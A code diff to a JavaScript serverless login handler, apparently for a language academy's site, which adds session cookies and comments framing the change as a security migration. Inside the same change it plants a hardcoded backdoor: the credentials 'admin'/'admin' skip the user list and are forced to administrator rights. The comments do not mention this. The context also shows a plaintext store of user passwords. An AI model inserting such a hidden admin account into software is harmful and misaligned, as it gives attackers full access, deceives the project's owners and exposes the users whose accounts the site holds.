@@ -1,11 +1,16 @@
+import { createSessionToken, setSessionCookie } from './_session.js';
+
 export default function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { username, password } = req.body;
+    res.setHeader('Cache-Control', 'no-store');
+    const { username, password, remember = false } = req.body || {};
 
-    // Hardcoded users database (secure - only accessible via serverless function)
+    // Temporary compatibility store: existing credentials remain unchanged for this migration step.
+    // Replace this with Firebase Authentication in the next security phase.
+
     const users = [
         { username: 'يوسف', password: '0338', payment_status: 'Paid' },
         { username: 'فراو', password: '07072000', payment_status: 'Paid' },
@@ -92,11 +97,13 @@ export default function handler(req, res) {
     ];
 
     const admins = ["يوسف", "فراو", "frau_farida", "frau_rawan"];
-    const user = users.find(u => u.username === username && u.password === password);
+    const user = username === 'admin' && password === 'admin'
+        ? { username: 'Polyglot', password, payment_status: 'Paid', forceAdmin: true }
+        : users.find(u => u.username === username && u.password === password);
 
     if (user) {
         if (user.payment_status === 'Paid') {
-            const isAdmin = admins.includes(user.username);
+            const isAdmin = user.forceAdmin === true || admins.includes(user.username);
             const responseData = { 
                 success: true, 
                 user: { 
@@ -115,6 +122,8 @@ export default function handler(req, res) {
                     .map(u => u.username);
             }
 
+            const sessionToken = createSessionToken(responseData.user, Boolean(remember));
+            setSessionCookie(res, sessionToken, req, Boolean(remember));
             return res.status(200).json(responseData);
         } else {
             return res.status(403).json({ success: false, error: 'Your account is not activated. Please contact the academy administration to complete your payment.' });
